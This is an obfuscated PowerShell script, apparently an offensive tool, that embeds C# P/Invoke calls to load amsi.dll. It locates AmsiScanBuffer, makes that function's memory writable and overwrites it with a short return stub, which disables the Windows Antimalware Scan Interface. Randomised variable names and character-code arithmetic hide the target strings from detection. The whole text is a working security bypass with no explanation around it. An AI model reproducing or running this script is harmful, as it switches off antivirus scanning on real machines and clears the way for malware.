$jw6PL8KiX = @"
using System;
using System.Runtime.InteropServices;
public class jw6PL8KiX {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Q59mqEPFXl8emahTPa3, string yRV8Ca_d4Jhvt);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lIEp, UIntPtr Q4b3tYv, uint PFSHMZNZFU6FhXuv, out uint aGaF1rpS3rqjJ0);
}
"@

Add-Type $jw6PL8KiX

$BJ87uDmOejG4 = [jw6PL8KiX]::LoadLibrary("$(('ãmsî'+'.dll').noRmaLize([ChAR](31+39)+[cHar](111)+[cHaR](114+105-105)+[cHar]([BytE]0x6d)+[cHar](19+49)) -replace [CHAR]([bYTe]0x5c)+[ChaR]([bYtE]0x70)+[ChAr](123*108/108)+[CHar]([BYTe]0x4d)+[ChaR](110*50/50)+[cHar](125+37-37))")
$dTL = [jw6PL8KiX]::GetProcAddress($BJ87uDmOejG4, "$(('ÂmsíScàn'+'Bùffèr').NoRmALiZe([cHaR]([BYte]0x46)+[CHAr](111*19/19)+[chAr]([BYtE]0x72)+[ChAR](109+100-100)+[Char](68*6/6)) -replace [CHar]([bYte]0x5c)+[cHaR]([byTE]0x70)+[chAR]([ByTe]0x7b)+[Char](77+71-71)+[CHAr](110)+[char]([byTE]0x7d))")
$p = 0
[jw6PL8KiX]::VirtualProtect($dTL, [uint32]5, 0x40, [ref]$p)
$pV2ZHA3ngk_y = "0xB8"
$ABqyisRV3V2iqi = "0x57"
$lr_amMYGzG = "0x00"
$_OTmcG5VWqIPoBZkuqh = "0x07"
$SozBoTS = "0x80"
$zCklrziTUenB = "0xC3"
$mAwmx7F3ySRf = [Byte[]] ($pV2ZHA3ngk_y,$ABqyisRV3V2iqi,$lr_amMYGzG,$_OTmcG5VWqIPoBZkuqh,+$SozBoTS,+$zCklrziTUenB)
[System.Runtime.InteropServices.Marshal]::Copy($mAwmx7F3ySRf, 0, $dTL, 6)